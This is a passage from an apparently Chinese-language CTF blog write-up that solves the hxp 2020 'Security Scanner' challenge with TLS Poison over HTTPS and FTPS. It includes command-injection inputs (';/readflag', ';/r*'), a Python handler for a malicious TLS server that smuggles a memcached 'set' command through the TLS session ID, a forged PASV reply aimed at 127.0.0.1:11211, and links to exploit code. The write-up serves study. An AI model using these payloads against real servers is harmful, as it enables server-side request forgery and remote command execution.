<a href=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png><img src=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png loading=lazy>
</a>
</figure></p>
<h3 id=solution-1>Solution 1</h3>
<p>From: <a class=link href=https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner target=_blank rel=noopener>https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner</a></p>
<p>我们先来看看第一种解法，这也是 perfect guesser 他们使用的类似解法，通过 HTTPS 来进行解题。</p>
<p>题目唯一一处可以让我们直接执行命令的地方就是<code>exec</code>处了，所以如果没有其他校验验证的话，我们可以直接使用命令注入进行 RCE ，例如传入<code>url=;/readflag</code>，这样题目执行顺序如下流程图所示：</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png><img src=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png loading=lazy>
</a>
</figure></p>
<p>这样题目在执行我们的命令时，就也会把回显显示给我们了，也就拿到 FLAG 了。</p>
<p>既然最后一步我们知道了，我们就得想办法如果绕过前面的验证步骤。主要验证也就是如下两个步骤：</p>
<ul>
<li>正则表达式：<code>^[0-9a-zA-Z:\.\/-]{1,64}</code>。表达式比较严格，看起来并没有什么可以让我们进行命令注入的机会。</li>
<li>即使绕过了正则，但是<code>file_get_contents</code>并不会认为<code>;/readflag</code>是合法协议，也不能接着去执行。</li>
</ul>
<p>所以问题就来到了如何将我们的 payload 写入 memcached 当中以及我们如何绕过前面两个正则。</p>
<p>既然是要写入 memcached 我们不难想到 2020 年 black hat 上的议题 When TLS Hack You ，其中作者使用的 demo 就是通过 TLS 配合 DNS Rebinding 来对 memcached 发起 SSRF 攻击，所以如何将我们的 payload 写入到 memcached 当中基本有了个大致的思路，问题是如何实现利用这个思路呢？</p>
<p>我们再来看看如果真是使用 TLS Poison 攻击的话，使用 HTTPS 是不是就可以满足以上两个限制的条件了呢？确实如此，<code>https://</code>并没有使用其他禁止的字符，并且我们可以通过 HTTPS 让题目的<code>file_get_contents</code>得到任意内容，包括满足他所需要的<code>001e# service=git-upload-pack\n</code>这个条件。</p>
<p>所以似乎看起来 TLS Poison 正是这个题目的关键！如果是这样的话，接下来我们就需要确定，我们应该使用 <code>file_get_contents</code>还是 git 来进行操作呢？也就是说哪一个支持 TLS 会话重用这个特性呢？我们知道<code>file_get_contents</code>并没有依赖 libcurl ，我们如果直接查看 PHP 源代码有点麻烦，不如直接通过让其访问我们 TLS Poison Demo 来测试，如果能有支持 TLS 会话重用，在 302 时，也就是第二次访问我们 TLS Server 即会带上 Session ID ，这个我们可以直接用wireshark 本地抓包即可看到了。但是经过测试其实我们可以看到<code>file_get_contents</code>并没有在第二次 TLS 会话时重用 Session ID，如图所示：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png loading=lazy>
</a>
</figure></p>
<p>所以接下来我们就只能寄希望于 git 了，那么 git 是否支持 TLS 重用会话？怎么确定 git 是否支持 TLS 会话重用呢？我们能不能确定 git 使用的是什么网络请求资源依赖库呢？比如 libcurl ？如果是 libcurl ，我们就好办了，因为明确知道 libcurl 对于 HTTPS 的支持是可以支持会话重用的，至少对于 OpenSSL 或者 GnuTLS 来说，都是支持此项特性的。</p>
<p>那么到底如何确定呢？这有点类似于找一个站点使用了什么 web 框架，一般来说我们可以尝试通过找站点特征、报错回显等方式来确定，但是 git 发起网络请求的 User-Agent 中只带了它自己的 UA 特征，并没有显示是否使用 libcurl ，在代码中虽然可以找到<code>&lt;curl/curl.h></code>，但是到底用没用我们似乎不是很好判断；所以我们可以尝试通过报错回显来确定 git 到底用没用 libcurl (idea from @zsx )，如何引起这个报错呢？不难想到我们可以尝试用一个 libcurl 不支持的协议来确定，比如 gopher 协议。接下来我们可以在自己服务器上放一个 php 让其 Location 跳转到 gopher 协议上，例如：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ cat 302.php                                                                                                                         
&lt;?php                                                                                                                                                                   
header<span class=o>(</span><span class=s2>&#34;Location: gopher://localhost/&#34;</span><span class=o>)</span><span class=p>;</span>

$ git ls-remote --tags -- http://localhost/302.php                                                                                    
fatal: unable to access <span class=s1>&#39;http://localhost/302.php/&#39;</span>: Protocol <span class=s2>&#34;gopher&#34;</span> not supported or disabled in libcurl 
</code></pre></div><p>我们就可以看到明显的 libcurl 错误回显。</p>
<p>既然确定了可以使用 git 来进行 TLS Poison 攻击 Memcached ，那么具体我们应该这么做呢？我们从 getFlag 开始来看看：</p>
<ol>
<li>要让<code>exec</code>执行<code>;/readflag</code>，我们要让<code>;/readflag</code>在 Memcached 中的 Value 为 &ldquo;OK&rdquo;</li>
<li>那怎么写入<code>;/readflag</code>呢？我们可以利用 git 来实施 TLS Poison ，向 Memcached 中写入 Key 为<code>;/readflag</code>，Value 为 &ldquo;OK&rdquo;</li>
<li>那怎么实施 TLS Poison 呢？部署 HTTPS Server ，先绕过之前两个限制，在 git 请求 HTTPS Server 的时候实行 TLS Poison</li>
</ol>
<p>具体流程图如下：</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png><img src=https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png loading=lazy>
</a>
</figure></p>
<p>其中我们可以使用双 A 记录的方法来优化 DNS Rebinding 方式，具体关于 TLS Poison 详细解释见：<a class=link href=https://blog.zeddyu.info/2021/04/20/tls-poison/ target=_blank rel=noopener>一篇文章带你读懂 TLS Poison 攻击</a></p>
<p>这里 wp 作者放出的 exp 其实并不可用，在 TLS 握手时会产生错误，所以我又不得不使用其他工具实现这个 exp ，而整个 exp 构造中比较关键的地方在于，如何让<code>file_get_contents</code>正常获取到指定内容后，git 再访问时就需要使用恶意的 TLS Server 。对于这个点，我们可以从请求的 UA 上做区分，判断 UA 中是否有 git 来区分这两者请求来返回对应的响应，所以 rustls 我就不考虑了&mldr;这玩意着实难改，于是选用了 tlslite-ng 作为 TLS 服务器，并修改<code>MySimpleHTTPHandler</code>函数中的处理 HTTP 请求的关键代码，如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=k>if</span> <span class=s1>&#39;git&#39;</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>headers</span><span class=p>):</span>
  <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;This is git! Redirecting it back to memcached and shutting down&#39;</span><span class=p>)</span>
  <span class=k>assert</span> <span class=n>session_id</span><span class=p>,</span> <span class=s1>&#39;Session id should have been set at this point&#39;</span>
  <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
    <span class=s1>&#39;Location&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;https://tls.exmaple.com:11211/pwned&#39;</span><span class=p>,</span>
  <span class=p>}</span>
  <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>get_http_response</span><span class=p>(</span><span class=mi>302</span><span class=p>,</span> <span class=n>headers</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>))</span>
  <span class=k>return</span>
<span class=k>else</span><span class=p>:</span>
  <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;This is PHP! Showing them something that looks like a git repo and stealing sandbox ID&#39;</span><span class=p>)</span>
  <span class=n>b64_sandbox_id</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/(.</span><span class=si>{14}</span><span class=s1>)/&#39;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
  <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>b64_sandbox_id</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
    <span class=n>b64_sandbox_id</span> <span class=o>+=</span> <span class=s1>&#39;=&#39;</span>
    <span class=n>sandbox_id</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>b64_sandbox_id</span><span class=p>)</span>
    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>sandbox_id</span><span class=p>)</span> <span class=o>==</span> <span class=mi>10</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;The sandbox id should have exactly 10 bytes, got: </span><span class=si>{</span><span class=n>sandbox_id</span><span class=si>}</span><span class=s1>&#39;</span>
    <span class=n>session_id</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>set &#39;</span> <span class=o>+</span> <span class=n>sandbox_id</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;;/r* 0 0 2</span><span class=se>\r\n</span><span class=s1>OK</span><span class=se>\r\n</span><span class=s1>&#39;</span>
    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>session_id</span><span class=p>)</span> <span class=o>==</span> <span class=mi>32</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;The session should have exactly 32 bytes, got: </span><span class=si>{</span><span class=n>session_id</span><span class=si>}</span><span class=s1>&#39;</span>
    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Got sandbox id: </span><span class=si>{</span><span class=n>sandbox_id</span><span class=si>}</span><span class=s1>, session_id: </span><span class=si>{</span><span class=n>session_id</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=n>fake_git</span> <span class=o>=</span> <span class=s1>&#39;001e# service=git-upload-pack</span><span class=se>\n</span><span class=s1>&#39;</span>
    <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>get_http_response</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=p>{},</span> <span class=n>fake_git</span><span class=p>))</span>
    <span class=k>return</span>
</code></pre></div><p>这里因为题目设置了 sandbox ，占用了 10 字节，而 TLS 1.2 中的 SessionID 局限于 32 字节，所以我们没办法直接使用<code>;/readflag</code>，否则会超出长度，直接使用<code>;/r*</code>也可以执行读取 flag 命令。最后打包整理的 Exp 放在：https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1</p>
<p>在自己的服务器上搭建好 TLS 服务器之后，最后用 exp.py 自动发包就能拿到 flag 了：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png loading=lazy>
</a>
</figure></p>
<h3 id=solution-2>Solution 2</h3>
<p>当然如果只是简单的复现 TLS Poison 我也不会这么详细的写一篇文章来讲这个题了， CTF 能带给我最大的快乐就是看到一些在自己预期之外的东西，这些东西往往都更有意思，也更 Amazing 。</p>
<p>结合前文，我们这里可以尝试使用 FTPS 来进行解答这个题目。如果使用 FTPS ，那么重定向、DNS Rebinding 的操作我们就可以不需要了，因为可以使用<code>PASV</code>直接将数据通道指向 127.0.0.1:11211 即可。</p>
<p>那么接下来就需要确定 git 中的 libcurl 是否受到<code>PASV</code>漏洞影响了，我们可以从 git 版本、简单搭建一个恶意的 FTP 服务器进行测试，这里就不展开进行测试了。（其实是比较懒）我们这里就直接开始尝试使用 FTPS 进行解题。</p>
<p>按照之前的流程，我们需要确定几个点：</p>
<ul>
<li>如何绕过之前题目使用<code>file_get_contents</code>对文件内容确认？我们可以直接创建<code>/info/ref</code>文件，内容为题目要求的内容即可</li>
<li>如何绕过正则？我们只需要配置好匿名 ftps 即可，就不需要引入为了用户认证而使用的<code>@</code>符号了，其余的字符就属于正则内的字符了</li>
<li>用隐式还是显式？因为我们使用的格式是<code>ftps://ftps.exmaple.com:11211/</code>这种形式，这只能是隐式 FTPS 的格式，所以使用隐式 FTPS</li>
</ul>
<p>剩下的便是如何构造 exp 的问题了，怎么去弄一个隐式 FTPS ，难道还要修改个恶意 vsftpd ？那样比较麻烦，这里我们可以使用 rustls 的转发功能，该功能可以帮我们处理了 TLS 创建的问题，并且按照之前的基础，我们也可以把它直接作为恶意 TLS 服务器，这样我们就只需要弄一个 socket 用来处理 FTP 即可。</p>
<p>依旧使用我仓库的 TLS 工具：https://github.com/ZeddYu/TLS-poison/ ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p <span class=m>11211</span> --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward <span class=m>2048</span>
</code></pre></div><p>然后在 2048 端口我们弄个 socket 监听并读一下 FTP ，然后就是处理 FTP 命令的事情了，这里可以使用 vsftpd 来进行命令响应的参考，最后实现：https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py</p>
<p><strong>PS：这里 FTP 服务记得要完整实现对 PASV 之后的命令处理，否则攻击失败。</strong></p>
<p>天知道这个坑了我多久&mldr;当时死活都不能复现，问作者 0xbb 也不知道什么情况，又是排 curl 版本，又是排 git 版本，又是排 OpenSSL ，又是排 GnuTLS ，反正各种排 bug ，万念俱灰，最后才找到这个地方&mldr;简直</p>
<p>这里我自己编译了一个存在<code>pasv</code>漏洞的 curl 调试，访问我们的 ftps 服务器之后就会对我们 127.0.0.1:11211 进行 TLS 会话重用，就会将我们的 payload 发送到 11211 端口了：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png loading=lazy>
</a>
</figure></p>
<p>写入之后基本上就没有什么问题了。</p>
<p>整个流程我们整理一下：</p>
<ul>
<li>
<p>首先得访问一次题目拿到 cookie</p>
</li>
<li>
<p>一开始的<code>file_get_contents</code>我们可以使用 vsftpd 来在匿名 ftp 目录下放置<code>/info/ref</code>文件，文件内容就是 &ldquo;001e# service=git-upload-pack\n&rdquo;</p>
</li>
<li>
<p>题目使用<code>file_get_contents</code>访问之后，我们就可以关闭 vsftpd ，然后开启 rustls 恶意 TLS 服务器，注意提前设置在 redis 当中设置好 payload</p>
</li>
<li>
<p>题目执行<code>exec</code>，也就是使用 git 来访问我们的 FTPS 服务器时，双方建立 TLS 握手，我们会设置可以执行读取 flag 的 Session ID</p>
</li>
<li>
<p>建立握手完毕后，执行 FTP 流程</p>
</li>
<li>
<p>在题目 git 处理 FTP 流程中，我们会给 git 发出的<code>PASV</code>命令请求的响应<code>227 Entering Passive Mode (127,0,0,1,43,203)\r\n</code></p>
</li>
<li>
<p>git 会根据得到的 127.0.0.1:11211 这个地址尝试进行 TLS 会话重用</p>
</li>
<li>
<p>至此，完成对 Memcached 的攻击，成功写入<code>\r\nset 1234567890;/r* 0 0 2\r\nOK\r\n</code>，其中那串连续数字我用来表示 sandbox id</p>
</li>
<li>
<p>带着最开始设置的 cookie 向题目提交 url 地址为<code>;/r*</code>，此时题目向 Memcached 查询 <code>1234567890;/r*</code>的值，得到 url 的值为 OK ，绕过限制</p>
</li>
<li>
<p>题目执行<code>exec("timeout -s KILL 3 git ls-remote --tags -- $url", $output, $return_var);</code>，其中<code>$url</code>就是我们传入的<code>;/r*</code>，完成命令注入，执行读取 flag 命令拿到 flag</p>
</li>
</ul>
<p>至此，完成这个题目的 FTPS 解法。exp 效果图如下：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png loading=lazy>
</a>
</figure></p>
<h3 id=something-else>Something else</h3>
<p>其实这个解法也是后来问的 0xbb 出题人，其实预期解法是利用 FTPS 的解法。但是比赛的时候，队友还找到了一处其他可能的地方想着 SSRF 来着，但是后来不太行，后面跟 Perfect Blue （也就是这次参赛的联合战队 perfect guesser 的联合队之一）的朋友交流了一下确实是用 TLS Poison ，并且他跟 A0E 某个师傅一样也重写了 DNS 相关部分内容2333</p>
<p>如果你觉得做完这个题目还觉得不过瘾，还可以去做一下 Tet CTF 的一个题目。在越南的 TetCTF 2021 当中，有一个单独的分类 Web & Crypto 有这么一道题：HackEmAll-Next-Gen-Proxy ，这道题当中就比较直接：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=k>def</span> <span class=nf>_set_cache</span><span class=p>(</span><span class=n>_key</span><span class=p>,</span> <span class=n>_value</span><span class=p>):</span>
    <span class=k>if</span> <span class=nb>str</span><span class=p>(</span><span class=n>_key</span><span class=p>)</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span> <span class=ow>and</span> <span class=nb>str</span><span class=p>(</span><span class=n>_value</span><span class=p>)</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>:</span>
        <span class=n>_cache_handle</span> <span class=o>=</span> <span class=n>pylibmc</span><span class=o>.</span><span class=n>Client</span><span class=p>([</span><span class=s2>&#34;127.0.0.1:11211&#34;</span><span class=p>],</span> <span class=n>binary</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
        <span class=n>_cache_handle</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>_key</span><span class=p>,</span> <span class=n>_value</span><span class=p>,</span> <span class=n>time</span><span class=o>=</span><span class=mi>60</span><span class=p>)</span>
        <span class=k>return</span> <span class=kc>True</span>

    <span class=k>else</span><span class=p>:</span>
        <span class=k>return</span> <span class=kc>False</span>

<span class=k>def</span> <span class=nf>_get_cache</span><span class=p>(</span><span class=n>_key</span><span class=p>):</span>
    <span class=n>_cache_handle</span><span class=o>=</span> <span class=n>pylibmc</span><span class=o>.</span><span class=n>Client</span><span class=p>([</span><span class=s2>&#34;127.0.0.1:11211&#34;</span><span class=p>],</span> <span class=n>binary</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>_cache_handle</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>_key</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>parse</span><span class=p>(</span><span class=n>_url</span><span class=p>):</span>
    <span class=n>_cmd</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;curl&#34;</span><span class=p>,</span> <span class=s2>&#34;-L&#34;</span><span class=p>,</span> <span class=s2>&#34;-k&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>_url</span><span class=p>)]</span>
    <span class=n>_content</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>(</span><span class=n>_cmd</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>_content</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span>
</code></pre></div><p>这个就已经有非常明显的提示了，同样是熟悉的 Memcached ，同样是<code>-L</code>选型特地允许 curl 重定向，很标准的一道 TLS Poison 题目，这里就不再多啰嗦了。不过对于这题，以及<code>-L</code>选项，当时有选手想出使用 gopher 来做这个题，本地都能打，但是到了远程就拉垮了，原因是在新版的 curl 中，就像我们一开始验证的一样， gopher 协议已经不再是 libcurl 默认支持的重定向协议了，只有 HTTP/HTTPS 和 FTP 是默认支持重定向，具体见：https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c</p>
<h2 id=conclusion>Conclusion</h2>
<p>至此，本篇加上之前的 <a class=link href=https://blog.zeddyu.info/2021/04/20/tls-poison/ target=_blank rel=noopener>《一篇文章带你读懂 TLS Poison 攻击》</a> ，基本上算是把 TLS Poison 的理论、实践、 CTF 应用都讲了一遍，或许以后可能还会弄个 TLS Poison 攻击 SMTP 的靶场（应该不太可能），但是 TLS Poison 需要探索的内容依旧还有很多，比如对于显式 FTPS 的 TLS Poison 利用化工具，如果没有了<code>PASV</code>漏洞，FTPS 还有没有其他方式利用等等问题，都是还有待大家进一步去挖掘的。</p>
<p>这些天都花了很多精力在部分研究上，一方面确实我觉得 TLS Poison 是一个很精彩的攻击方式，尽管它局限性很大，但是这个攻击整体构造利用都相对比较巧妙，也是对在众多对 TLS 密码算法的攻击中令人耳目一新；一方面对于 CTF 题目，尤其是 hxp 这个题目我一直耿耿于怀，况且正好这个也是 TLS Poison 的深层次利用，这也成为了后来我整理 TLS Poison 攻击的动力来源之一，并且我也觉得 FTP 真是个非常有意思的协议，而这题预期用到 FTPS 就必须弄懂 TLS Poison ，所以就不得不去把 TLS Poison 弄一遍。没弄之前还以为是比较难的，因为看到好几个选手都重新弄了 DNS 部分，甚至还需要重写一个 DNS Server ，不过对于恶意 TLS 服务这一块确实需要改写 TLS 服务框架才能做。</p>
<p>还有一方面是，我之前发朋友圈探讨 CTF 相关价值观的问题，以及 CTF 是否是信息安全最佳入门方式，@Anciety 评论说 CTF 可能不是信息安全入门方式，但是他认为是信息安全研究的入门方式。正如他所说，通过这个 CTF 题目，我对 TLS Poison 进行了更深入的探究，也有了更多的理解，这可能就是一道良好的 CTF 题目给安全研究者带来的好处之一吧，同时也带给了我很多快乐，也希望以后能遇到更多类似优秀的题目，能引导、推动我去做更多有意思更深层次的研究。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/Sec/>Sec</a>
<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2021/12/20/2021-12-20-ANewNovelLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
<article>
<a href=/2020/10/15/Defcon28final/>
<div class=article-details>
<h2 class=article-title>DEFCON 28 Final 杂记</h2>
</div>
</a>
</article>
<article>
<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2021 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#introduction-of-ftps>Introduction of FTPS</a>
<ol>
<li><a href=#implicit-mode>Implicit Mode</a></li>
<li><a href=#explicit-mode>Explicit Mode</a></li>
</ol>
</li>
<li><a href=#tls-poison-in-ftps>TLS Poison In FTPS</a>
<ol>
<li><a href=#explicit>Explicit</a></li>
<li><a href=#implicit>Implicit</a></li>
<li><a href=#pasv>PASV</a></li>
</ol>
</li>
<li><a href=#hxp-ctf---security-scanner>HXP CTF - Security Scanner</a>
<ol>
<li><a href=#description>Description</a></li>
<li><a href=#analyze>Analyze</a></li>
<li><a href=#solution-1>Solution 1</a></li>
<li><a href=#solution-2>Solution 2</a></li>
<li><a href=#something-else>Something else</a></li>
</ol>
</li>
<li><a href=#conclusion>Conclusion</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
